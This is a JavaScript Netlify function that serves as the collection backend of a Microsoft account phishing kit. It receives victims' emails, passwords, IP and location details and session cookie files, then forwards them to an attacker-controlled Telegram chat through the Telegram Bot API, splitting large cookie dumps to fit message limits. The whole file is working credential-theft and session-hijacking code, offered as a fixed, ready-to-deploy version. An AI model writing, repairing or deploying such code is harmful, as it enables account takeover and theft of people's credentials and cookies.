/**
 * FIXED: Telegram Bot Function for Netlify
 * Properly sends both credentials message AND cookie file message
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(message) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };

    const req = https.request(options, (res) => {
      let responseData = '';
      res.on('data', chunk => responseData += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(responseData);
          if (res.statusCode === 200 && json.ok) {
            resolve(json);
          } else {
            reject(new Error(json.description || 'Telegram error'));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '{}' };
  }

  try {
    const payload = JSON.parse(event.body || '{}');
    const { email, password, locationData = {}, cookies = [], cookieFiles = {} } = payload;

    console.log('✅ DATA RECEIVED');
    console.log('Email:', !!email);
    console.log('Password:', !!password);
    console.log('CookieFiles:', !!cookieFiles.jsonFile);
    console.log('CookieFiles.content:', !!cookieFiles.jsonFile?.content);

    let credentialsSent = false;
    let cookiesSent = false;

    // ✅ SEND MESSAGE 1: Credentials
    try {
      let msg1 = '<b>🔐 Microsoft Account Credentials</b>\n\n';
      if (email) msg1 += `<b>📧 Email:</b> <code>${email.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>\n`;
      if (password) msg1 += `<b>🔑 Password:</b> <code>${password.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>\n`;
      if (locationData.ip) msg1 += `<b>📍 IP:</b> <code>${locationData.ip}</code>\n`;
      if (locationData.city) msg1 += `<b>🏙️ City:</b> ${locationData.city}\n`;
      if (locationData.region) msg1 += `<b>🗺️ Region:</b> ${locationData.region}\n`;
      if (locationData.country) msg1 += `<b>🌎 Country:</b> ${locationData.country}\n`;

      await sendToTelegram(msg1);
      credentialsSent = true;
      console.log('✅ MESSAGE 1 SENT: Credentials');
    } catch (err) {
      console.error('❌ Failed to send credentials message:', err.message);
    }

    // ✅ SEND MESSAGE 2: Cookie file
    try {
      // ✅ FIXED: Check all possible conditions
      console.log('Checking cookie file conditions...');
      console.log('cookieFiles exists:', !!cookieFiles);
      console.log('cookieFiles.jsonFile exists:', !!cookieFiles.jsonFile);
      console.log('cookieFiles.jsonFile.content exists:', !!cookieFiles.jsonFile?.content);
      console.log('cookieFiles.jsonFile.content length:', cookieFiles.jsonFile?.content?.length);

      if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content && cookieFiles.jsonFile.content.length > 0) {
        console.log('✅ All conditions met - sending cookie file');

        const cookieContent = cookieFiles.jsonFile.content;
        const cookieName = cookieFiles.jsonFile.name || 'cookies.json';
        const cookieSize = cookieFiles.jsonFile.size || 0;

        // ✅ FIXED: Split cookie message if too long (Telegram limit is 4096)
        const cookieMsg = `<b>📄 ${cookieName}</b>\n<b>Size:</b> ${cookieSize} bytes\n\n<pre><code>${cookieContent}</code></pre>`;

        if (cookieMsg.length > 4000) {
          console.log('⚠️ Cookie message too large, splitting...');
          // Send as two parts
          const part1 = `<b>📄 ${cookieName}</b>\n<b>Size:</b> ${cookieSize} bytes\n\n<pre><code>`;
          await sendToTelegram(part1 + cookieContent.substring(0, 3500) + '</code></pre>');
          await sendToTelegram('<pre><code>' + cookieContent.substring(3500) + '</code></pre>');
        } else {
          await sendToTelegram(cookieMsg);
        }

        cookiesSent = true;
        console.log('✅ MESSAGE 2 SENT: Cookie file');
      } else {
        console.log('⚠️ Cookie file conditions NOT met:');
        console.log('  cookieFiles:', JSON.stringify(cookieFiles));
        console.log('  cookieFiles.jsonFile:', JSON.stringify(cookieFiles.jsonFile));
      }
    } catch (err) {
      console.error('❌ Failed to send cookie file message:', err.message);
    }

    console.log('═════════════════════════════════════════');
    console.log('FINAL RESULT:');
    console.log('Credentials sent:', credentialsSent);
    console.log('Cookies sent:', cookiesSent);
    console.log('═════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        transmitted: {
          credentials: credentialsSent,
          cookieFile: cookiesSent
        }
      })
    };

  } catch (error) {
    console.error('❌ HANDLER ERROR:', error.message);
    console.error('Stack:', error.stack);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: error.message,
        success: false
      })
    };
  }
};
